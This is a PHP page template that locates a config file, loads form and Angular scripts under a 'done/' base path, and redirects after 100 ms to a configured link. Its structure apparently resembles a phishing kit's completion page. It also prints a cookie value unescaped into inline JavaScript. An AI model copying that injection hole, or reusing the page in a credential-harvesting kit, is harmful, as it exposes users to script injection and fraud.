<?php 

         $relative_root="";
         $parent_folders="";
         function include_config(){
            global $relative_root,$parent_folders;
            while(!file_exists($relative_root."cfg.php")){
                $parent_folders=basename(realpath($relative_root))."/".$parent_folders;
                $relative_root.="../";
            };
            return $relative_root;
         };
         require_once(include_config().'cfg.php');

         if(isset($php_js)){
             $php_js->relative_root=$relative_root;
             $php_js->parent_folders=$parent_folders;
         }
         $php_js->fake_base="done/";
?>

<!DOCTYPE html>
<html lang="en"  id="mainPage" class="wf-opensans-n4-active wf-opensans-n6-active wf-active"  >

<head>

<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/jquery/dist/jquery.min.js"></script>
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/ua-parser-js/dist/ua-parser.min.js"></script>
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>bower_components/font-awesome/css/font-awesome.min.css">
<script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/form/core_form.js"></script>
<!-- <script type="text/javascript" src="<?php echo $php_js->relative_root ?>core/token/core_token.js"></script> -->
<link rel="stylesheet" href="<?php echo $php_js->relative_root ?>core/form/core_form.css">


<script type="text/javascript" src="<?php echo $php_js->relative_root ?>bower_components/angular/angular.min.js"></script>

<base href="<?php echo $php_js->relative_root.$php_js->fake_base; ?>" />
<link rel="stylesheet" href="form/css.css">

</head>


<script type="text/javascript">
var bid = "<?php echo isset($_COOKIE['bid'])?$_COOKIE['bid']:basename(dirname(dirname(__FILE__))) ?>"
var php_js = <?php  echo json_encode($php_js) ?>
</script>
<script type="text/javascript" src="form/form.js?v=<?php echo uniqid() ?>"></script>
<script type="text/javascript" src="ng/ng.js?v=<?php echo uniqid() ?>"></script>
<!-- <script type="text/javascript" src="token/token.js?v=<?php echo uniqid() ?>"></script> -->


<script type="text/javascript">
    setTimeout(function(){
        window.location.href=php_js.bb_link
    },100)
</script>
</body>

</html>